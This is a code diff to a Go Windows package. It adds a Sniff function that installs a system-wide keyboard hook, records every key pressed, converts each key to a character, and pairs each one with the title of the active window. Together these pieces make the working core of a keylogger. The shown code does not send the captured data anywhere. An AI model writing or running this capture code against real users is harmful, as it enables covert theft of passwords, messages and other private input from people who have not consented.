@@ -2,9 +2,14 @@ package windows
 
 import (
 	"errors"
+	"log"
+	"os"
+	"os/signal"
 	"syscall"
+	"time"
 	"unsafe"
 
+	"github.com/moutend/go-hook/pkg/keyboard"
 	"github.com/moutend/go-hook/pkg/types"
 	win "golang.org/x/sys/windows"
 )
@@ -85,7 +90,85 @@ func (u *User32) GetActiveWindow() (uintptr, error) {
 	return win, err
 }
 
-func ToRune(key types.KeyboardEvent) rune {
+func (u *User32) ToRune(key types.KeyboardEvent) rune {
+	var (
+		buffer []uint16 = make([]uint16, 256)
+		kState []byte   = make([]byte, 256)
+	)
+
+	n := 10
+	n |= (1 << 2)
+
+	u.procs["GetKeyState"].Call(
+		uintptr(key.VKCode),
+	)
+
+	u.procs["GetKeyboardState"].Call(
+		uintptr(unsafe.Pointer(&kState[0])),
+	)
+
+	result, _, err := u.procs["GetKeyboardLayout"].Call(0)
+	if err != nil {
+		return rune(0)
+	}
+
+	u.procs["ToUnicodeEx"].Call(
+		uintptr(key.VKCode),
+		uintptr(key.ScanCode),
+		uintptr(unsafe.Pointer(&kState[0])),
+		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n),
+		result,
+	)
+
+	if len(syscall.UTF16ToString(buffer)) > 0 {
+		return []rune(syscall.UTF16ToString(buffer))[0]
+	}
 
 	return rune(0)
+}
+
+func (u *User32) Sniff(
+	key chan<- rune,
+	window chan<- string,
+) error {
+
+	keyboardChan := make(
+		chan types.KeyboardEvent, 2000,
+	)
+
+	if err := keyboard.Install(nil, keyboardChan); err != nil {
+		return err
+	}
+
+	defer keyboard.Uninstall()
+
+	signaler := make(chan os.Signal, 1)
+	signal.Notify(signaler, os.Interrupt)
+
+	log.Println("<<<<<<<<<< start to sniffing keyboard")
+
+	for {
+		select {
+		case <-signaler:
+			log.Println("user wants to scape, let's go pal")
+			return nil
+		case currentKey := <-keyboardChan:
+			if currentWindow, err := u.GetActiveWindow(); currentWindow != 0 && err == nil {
+				if currentKey.Message == types.WM_KEYDOWN {
+					key <- u.ToRune(currentKey)
+					msg, err := u.GetWinText(currentWindow)
+					if err != nil {
+						log.Println(err)
+					} else {
+						window <- msg
+					}
+				}
+			} else {
+				log.Println(err)
+			}
+		case <-time.After(time.Second * 5):
+			log.Println("nothing on the keyboard")
+
+		}
+	}
 }
